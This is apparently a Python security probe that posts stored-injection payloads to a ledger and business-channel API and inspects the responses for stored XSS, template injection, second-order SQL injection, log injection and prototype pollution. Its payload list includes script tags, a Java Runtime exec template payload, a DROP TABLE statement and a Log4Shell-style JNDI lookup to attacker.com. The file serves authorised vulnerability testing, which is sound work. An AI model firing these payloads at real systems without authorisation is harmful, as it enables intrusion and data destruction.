"""
Stored Injection / Second-Order Attack Probe

Tests for vulnerabilities where malicious data is stored safely but
causes harm when retrieved and rendered:
- Stored XSS (Cross-Site Scripting)
- Second-Order SQL Injection
- Template Injection (SSTI)
- Log Injection
- Deserialization attacks
"""

import asyncio
import time
from typing import Any

import httpx

from .base_probe import BaseProbe, ProbeResult, parse_args, run_probe


# Payloads that should be STORED but cause harm when RETRIEVED
STORED_PAYLOADS = {
    "xss_script": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
    ],
    "xss_encoded": [
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{constructor.constructor('return this')()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "sql_second_order": [
        "admin'--",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM information_schema.tables--",
    ],
    "log_injection": [
        "test\nINFO: Fake log entry",
        "test\r\nAdmin logged in successfully",
        "\x1b[31mRed text in logs\x1b[0m",
        "${jndi:ldap://attacker.com/a}",  # Log4Shell style
    ],
    "json_injection": [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
    ],
    "unicode_tricks": [
        "\u202eGNISSORC\u202d",  # Right-to-left override
        "\u0000null_byte",
        "\ufeffBOM_character",
    ],
}

# Endpoints to test stored injection
STORE_ENDPOINTS = [
    # v1 endpoints
    {
        "store": {
            "method": "POST",
            "endpoint": "/api/ledger/chains/test/events",
            "body_template": {
                "entity_id": "{payload}",
                "event_type": "stored_test",
                "data": {"content": "{payload}"}
            }
        },
        "retrieve": {
            "method": "GET",
            "endpoint": "/api/ledger/chains/test",
        }
    },
    # v2 channel endpoints
    {
        "store": {
            "method": "POST",
            "endpoint": "/api/business/channels",
            "body_template": {
                "channel_id": "test-{idx}",
                "channel_name": "{payload}",
                "organizations": ["org1"],
                "policy": {"type": "majority"}
            }
        },
        "retrieve": {
            "method": "GET",
            "endpoint": "/api/business/channels/test-{idx}",
        }
    },
    # v2 organization endpoints  
    {
        "store": {
            "method": "POST",
            "endpoint": "/api/business/organizations",
            "body_template": {
                "org_id": "test-org-{idx}",
                "org_name": "{payload}",
                "ca_config": {"ca_url": "https://example.com"}
            }
        },
        "retrieve": {
            "method": "GET",
            "endpoint": "/api/business/organizations/test-org-{idx}",
        }
    },
    # v2 contract endpoints
    {
        "store": {
            "method": "POST",
            "endpoint": "/api/business/contracts",
            "body_template": {
                "contract_id": "contract-{idx}",
                "version": "1.0",
                "implementation": "{payload}",
                "metadata": {"description": "{payload}"}
            }
        },
        "retrieve": {
            "method": "POST",
            "endpoint": "/api/business/contracts/execute",
            "body_template": {
                "contract_id": "contract-{idx}",
                "event": {"event": "test", "entity_id": "e1"},
                "context": {}
            }
        }
    },
]


def _is_encoded(payload: str, response_body: str) -> bool:
    """Check if payload appears encoded in response."""
    # Common HTML encodings
    encoded_lt = "&lt;" if "<" in payload else None
    encoded_gt = "&gt;" if ">" in payload else None

    if encoded_lt and encoded_lt in response_body:
        return True
    if encoded_gt and encoded_gt in response_body:
        return True

    return False


def _analyze_xss_category(
        result: ProbeResult,
    retrieve_body: str,
    store_body: str,
    payload: str,
) -> bool:
    dangerous_patterns = ["<script>", "<img", "<svg", "onerror=", "onload="]
    for pattern in dangerous_patterns:
        if pattern in retrieve_body and pattern in payload.lower():
            result.add_finding(
                severity="high",
                message="Stored XSS: Payload reflected unencoded in response",
                details={"payload": payload[:50], "pattern": pattern},
            )
            return True
    if payload in store_body or _is_encoded(payload, retrieve_body):
        result.add_finding(
            severity="info",
            message="XSS payload properly encoded or rejected",
        )
    return False


def _analyze_template_injection(
        result: ProbeResult,
    retrieve_body: str,
    payload: str,
) -> None:
    if "49" in retrieve_body and "7*7" in payload:
        result.add_finding(
            severity="high",
            message="Template Injection: Expression evaluated",
            details={"payload": payload, "result": "49 found in response"},
        )
    else:
        result.add_finding(
            severity="info",
            message="Template expression not evaluated",
        )


def _analyze_sql_second_order(
        result: ProbeResult,
    retrieve_body: str,
    payload: str,
) -> bool:
    sql_errors = ["syntax error", "mysql", "postgresql", "sqlite", "ora-"]
    body_lower = retrieve_body.lower()
    for err in sql_errors:
        if err in body_lower:
            result.add_finding(
                severity="high",
                message="Second-Order SQL Injection: SQL error in response",
                details={"payload": payload[:50], "error_hint": err},
            )
            return True
    result.add_finding(
        severity="info",
        message="No SQL errors detected",
    )
    return False


def _analyze_log_injection(
        result: ProbeResult,
    payload: str,
) -> None:
    if "\n" in payload or "\r" in payload:
        result.add_finding(
            severity="low",
            message="Log injection payload stored - manual log review needed",
            details={"payload_type": "newline_injection"},
        )
    else:
        result.add_finding(
            severity="info",
            message="Log injection test completed",
        )


def _analyze_json_injection(
        result: ProbeResult,
    retrieve_body: str,
    payload: str,
) -> None:
    if "admin" in retrieve_body and "true" in retrieve_body:
        result.add_finding(
            severity="medium",
            message="Possible prototype pollution detected",
            details={"payload": payload[:50]},
        )
    else:
        result.add_finding(
            severity="info",
            message="JSON injection payload handled",
        )


def _analyze_unicode_tricks(
        result: ProbeResult,
    retrieve_body: str,
) -> None:
    indicators = ["\u202e", "\u0000", "\ufeff"]
    if any(c in retrieve_body for c in indicators):
        result.add_finding(
            severity="low",
            message="Unicode control characters preserved in output",
            details={"payload_type": "unicode_obfuscation"},
        )
    else:
        result.add_finding(
            severity="info",
            message="Unicode handled properly",
        )


def _analyze_generic_category(
        result: ProbeResult,
    category: str,
) -> None:
    result.add_finding(
        severity="info",
        message=f"Test completed for category: {category}",
    )


def _check_error_disclosure(
        result: ProbeResult,
    response: httpx.Response,
    phase: str
):
    """Check for sensitive error message disclosure."""
    if response.status_code >= 500:
        body = response.text[:500] if response.text else ""

        # Check for stack traces
        stack_indicators = ["Traceback", "File \"", "line ", "Exception", "Error:"]
        for indicator in stack_indicators:
            if indicator in body:
                result.add_finding(
                    severity="medium",
                    message=f"Stack trace exposed in {phase} response",
                    details={"indicator": indicator, "status": response.status_code}
                )
                return

        # Check for path disclosure
        path_indicators = ["/home/", "/var/", "C:\\", "/usr/"]
        for indicator in path_indicators:
            if indicator in body:
                result.add_finding(
                    severity="low",
                    message=f"File path disclosed in {phase} response",
                    details={"indicator": indicator}
                )
                return


def _analyze_stored_injection(
        result: ProbeResult,
    store_response: httpx.Response,
    retrieve_response: httpx.Response,
    category: str,
    payload: str
):
    """Analyze responses for stored injection vulnerabilities."""
    retrieve_body = retrieve_response.text[:2000] if retrieve_response.text else ""
    store_body = store_response.text[:1000] if store_response.text else ""
    early_exit = False
    if category.startswith("xss"):
        early_exit = _analyze_xss_category(
            result, retrieve_body, store_body, payload
        )
    elif category == "template_injection":
        _analyze_template_injection(result, retrieve_body, payload)
    elif category == "sql_second_order":
        early_exit = _analyze_sql_second_order(
            result, retrieve_body, payload
        )
    elif category == "log_injection":
        _analyze_log_injection(result, payload)
    elif category == "json_injection":
        _analyze_json_injection(result, retrieve_body, payload)
    elif category == "unicode_tricks":
        _analyze_unicode_tricks(result, retrieve_body)
    else:
        _analyze_generic_category(result, category)
    if not early_exit:
        _check_error_disclosure(result, store_response, "store")
        _check_error_disclosure(result, retrieve_response, "retrieve")


class StoredInjectionProbe(BaseProbe):
    """Probe for stored/second-order injection vulnerabilities."""
    
    def __init__(self, base_url: str, api_key: str = None, timeout: float = 10.0):
        super().__init__(base_url, api_key, timeout)
        self.payload_idx = 0
    
    async def run(self):
        """Run all stored injection tests."""
        async with httpx.AsyncClient(
            base_url=self.base_url,
            timeout=self.timeout,
            follow_redirects=False
        ) as client:
            for endpoint_config in STORE_ENDPOINTS:
                for category, payloads in STORED_PAYLOADS.items():
                    for payload in payloads:
                        self.payload_idx += 1
                        await self._test_stored_injection(
                            client, endpoint_config, category, payload
                        )
    
    async def _test_stored_injection(
        self,
        client: httpx.AsyncClient,
        endpoint_config: dict[str, Any],
        category: str,
        payload: str
    ):
        """Test a single stored injection scenario."""
        store_config = endpoint_config["store"]
        retrieve_config = endpoint_config["retrieve"]
        
        result = ProbeResult(
            name=f"stored_{category}_{store_config['endpoint'][:25]}",
            endpoint=store_config["endpoint"]
        )
        
        try:
            # Step 1: STORE the malicious payload
            store_body = self._inject_payload(
                store_config.get("body_template", {}),
                payload,
                self.payload_idx
            )
            
            start = time.time()
            store_response = await client.request(
                store_config["method"],
                store_config["endpoint"],
                headers=self.get_headers(),
                json=store_body
            )
            store_time = (time.time() - start) * 1000
            
            # Step 2: RETRIEVE the data
            retrieve_endpoint = retrieve_config["endpoint"].replace(
                "{idx}", str(self.payload_idx)
            )
            
            if retrieve_config["method"] == "GET":
                retrieve_response = await client.get(
                    retrieve_endpoint,
                    headers=self.get_headers()
                )
            else:
                retrieve_body = self._inject_payload(
                    retrieve_config.get("body_template", {}),
                    payload,
                    self.payload_idx
                )
                retrieve_response = await client.request(
                    retrieve_config["method"],
                    retrieve_endpoint,
                    headers=self.get_headers(),
                    json=retrieve_body
                )
            
            result.elapsed_ms = store_time
            result.status_code = retrieve_response.status_code
            
            # Analyze for vulnerabilities
            _analyze_stored_injection(
                result, 
                store_response, 
                retrieve_response, 
                category, 
                payload
            )
            
        except httpx.RequestError as e:
            result.error = str(e)
        except Exception as e:
            result.error = f"Unexpected: {str(e)}"
        
        self.results.append(result)
    
    def _inject_payload(
        self, 
        template: dict[str, Any], 
        payload: str,
        idx: int
    ) -> dict[str, Any]:
        """Inject payload into body template."""
        result = {}
        for key, value in template.items():
            if isinstance(value, str):
                value = value.replace("{payload}", payload)
                value = value.replace("{idx}", str(idx))
                result[key] = value
            elif isinstance(value, dict):
                result[key] = self._inject_payload(value, payload, idx)
            elif isinstance(value, list):
                result[key] = value
            else:
                result[key] = value
        return result


if __name__ == "__main__":
    args = parse_args("Test for stored/second-order injection vulnerabilities")
    asyncio.run(run_probe(StoredInjectionProbe, args))
